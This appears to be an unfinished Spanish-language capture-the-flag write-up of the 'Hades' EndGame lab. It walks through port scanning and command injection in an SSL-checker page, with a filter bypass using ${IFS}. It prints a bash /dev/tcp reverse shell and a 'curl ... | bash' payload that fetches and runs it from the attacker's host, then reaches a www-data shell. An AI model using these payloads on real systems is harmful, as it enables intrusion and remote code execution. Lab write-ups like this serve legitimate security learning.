---
title: "EndGame - Hades"
excerpt: "Se realizará un WriteUp del EndGame retirado Hades que cuenta con máquinas Windows. Desarrollaremos cada una paso a paso con el fin de entender y profundizar en nuevos conceptos."
header:
  teaser: "/assets/images/Hades.png"
categories:
  - WriteUp
---
<!-- Puedes usar HTML para la imagen y agregar una clase -->
<img src="{{ page.header.teaser }}" alt="Teaser image" class="teaser-img"> 

Iniciamos la máquina escaneando los puertos con nmap, encontrando solo un puerto abierto (443/tcp) correspondiente a un servicio web por HTTPS.

```bash
❯ nmap 10.13.38.16
Nmap scan report for 10.13.38.16  
PORT    STATE SERVICE
443/tcp open  https
```

En la página web encontramos varias pestañas, una de ellas es "SSL TOOLS", que contiene un checker de certificados SSL.

Usando `mitmdump`, escuchamos las peticiones al puerto 443 para capturar información del certificado.

```bash
❯ sudo mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2  
```

Al hacer una petición contra nuestra dirección IP VPN, capturamos la cabecera `User-Agent`, que indica que la petición se emitió desde un comando `curl/7.58.0`.

```bash
❯ sudo mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2  
```

Intentamos ejecutar un comando `$(id)` en la dirección web del servidor para obtener el usuario que lo ejecutó.

```bash
❯ sudo mitmdump -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=1  
```

Para obtener una shell en la máquina, creamos un archivo `index.html` con una reverse shell en Bash y lo compartimos a través de un servidor HTTP de Python.

```bash
❯ cat index.html
bash -i >& /dev/tcp/10.10.14.10/443 0>&1

❯ sudo python3 -m http.server 80
```

Notamos una blacklist con caracteres, incluido el espacio, pero lo evadimos usando `${IFS}` en lugar de espacio.

```bash
10.10.14.10/$(curl${IFS}10.10.14.10|bash)
```

Al enviar la petición, se carga nuestro `index.html` con la reverse shell, obteniendo acceso como `www-data` y encontrando la primera flag.

```bash
❯ sudo netcat -lvnp 443
```

```plaintext
www-data@cee1146c7ac1:~/html/ssltools$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cee1146c7ac1:~/html/ssltools$ hostname -I
172.17.0.2
www-data@cee1146c7ac1:~/html/ssltools$ ls
0fe092ba0_flag.txt  certificate.php  logo.png
www-data@cee1146c7ac1:~/html/ssltools$ cat 0fe092ba0_flag.txt  
HADES{Fr4**********Ng}
www-data@cee1146c7ac1:~/html/ssltools$
```


## INCOMPLETO..